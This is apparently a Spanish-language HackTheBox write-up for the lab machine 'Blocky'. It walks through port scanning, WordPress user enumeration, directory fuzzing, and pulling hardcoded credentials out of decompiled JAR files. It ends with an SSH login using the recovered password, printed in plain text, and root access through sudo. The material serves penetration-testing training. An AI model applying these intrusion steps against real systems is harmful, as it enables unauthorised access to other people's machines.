---
layout: post
title: HTB Blocky
date: '2023-12-21 22:24:13 -0500'
categories: [HTB, Easy]
tags: [Web, WordPress, Linux, Sudoers, SSH, Jar, Enumeration, Fuzzing] 
image:
  path: /blocky/preview.png
  alt: Blocky
---

## Resumen
![logo](/blocky/logo.png){: .right w="200" h="200" }
**Blocky** es una máquina en la que lo más importante, como siempre, es la **enumeración**. Al iniciar, se puede ver un servidor de **WordPress** en donde se expone el nombre de un usuario fácilmente dentro de los **posts**. Después de eso, se puede realizar **fuzzing** sobre los directorios de la web y con esto se puede ver que existe uno en donde se encuentran dos archivos **.jar**. Por lo que es necesario revisarlos con **JD-GUI** y **¡sorpresa!** En ellos se encuentran las credenciales que hacían falta para el usuario **notch**, por lo que se puede intentar ingresar por medio de **SSH**. Ya una vez dentro, solo hace falta revisar los privilegios a nivel de **sudoers** y se puede ver que se puede ejecutar cualquier comando como **root**.

## Reconocimiento

Para comenzar, se realiza un ping a la máquina para comprobar si hay conexión con ella: 

```bash
ping 10.10.10.37 -c 1
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=270 ms

--- 10.10.10.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 270.073/270.073/270.073/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos

Se puede realizar un escaneo de puertos con **Nmap** para ver cuáles se encuentran abiertos.

```bash
nmap -p- --min-rate 2000 10.10.10.37 -Pn -oG ports

Nmap scan report for blocky.htb (10.10.10.37)
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```
{: .nolineno}

Ahora que se obtuvieron los **puertos abiertos**, se puede realizar un escaneo mucho más profundo para ver qué **tecnologías** se encuentran corriendo en cada uno.


```bash
nmap -p21,22,80,25565 -sVC 10.10.10.37 -Pn -oN versions

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
## Enumeracion

Al revisar la web, se ve que se encuentra bajo un dominio, por lo que hay que registrar el dominio **blocky.htb** en el archivo **/etc/hosts**.

![fail](/blocky/fail.png)


```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

#others
10.10.10.37     blocky.htb
```
{: .nolineno file="/etc/passwd"}


Y al revisar la web, se puede ver **WordPress** con temática de **Minecraft**.

![web](/blocky/web.png)



También se puede revisar qué **tecnologías** está utilizando la página con ayuda de **WhatWeb** mediante el siguiente comando:

```bash
whatweb http://10.10.10.37/

http://10.10.10.37/ [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], RedirectLocation[http://blocky.htb], Title[302 Found]

http://blocky.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```
{: .nolineno}



Como es una web que está haciendo uso de **WordPress**, se puede hacer uso de **WPScan** para intentar enumerar usuarios y versiones de los **plugins**.
```bash
wpscan --url http://blocky.htb -e vp,u         
```
{: .nolineno}



Y dentro de la información importante se puede ver que existe un usuario llamado **notch**.
```bash
[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
{: .nolineno}

Este usuario puede ser enumerado al revisar la **web**. Si se observan los **posts** realizados, se puede notar que solo hay un **post**, y fue escrito por él.

![postnotch](/blocky/postnotch.png)



Como no parece haber nada interesante, se puede revisar qué directorios tiene la web, y dentro de uno de estos se encuentra uno que tiene un contenido bastante interesante.

```bash
gobuster dir -u http://blocky.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt  -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blocky.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 294]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/server-status        (Status: 403) [Size: 298]
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
Progress: 20476 / 20477 (100.00%)
===============================================================
Finished
===============================================================
```
{: .nolineno}


Por lo que, al revisar dentro de los **plugins**, se puede ver que existen dos archivos **JAR** que pueden ser utilizados para analizar la **aplicación**.

![plugins](/blocky/plugins.png)


Estos archivos se pueden revisar con la ayuda de **JD-GUI**, solo invocándolo desde la terminal con el siguiente comando:
```bash
jd-gui
```
{: .nolineno}


Al revisar dentro de los archivos, se puede ver que existe un archivo llamado **BlockyCore.class**, y dentro de él se encuentran las credenciales de servicio de **phpMyAdmin** que estaban dentro del **WordPress**.
![jar](/blocky/jar.png)

## Explotación


Por lo que se puede pensar que las credenciales se estaban reutilizando dentro del equipo y se puede intentar ingresar al equipo con ayuda de **SSH** usando las credenciales **notch**:**8YsqfCTnvxAUeduzjNSXe22**. 

```bash
ssh notch@10.10.10.37
notch@10.10.10.37's password:8YsqfCTnvxAUeduzjNSXe22

Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ 
```
{: .nolineno}
## Escalada de Privilegios 


Ahora que se cuenta con acceso al equipo, se puede intentar revisar si el usuario cuenta con algún tipo de **privilegios** a nivel de **sudoers** con el comando `sudo -l`.
```bash
sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ 
```
{: .nolineno}


Y sorprendentemente, puede ejecutar cualquier comando como **root**, por lo que se cambia a ese usuario.
```bash
sudo su
root@Blocky:/home/notch# whoami
root
root@Blocky:/home/notch# ls /root
root.txt
root@Blocky:/home/notch# 
```
{: .nolineno}

















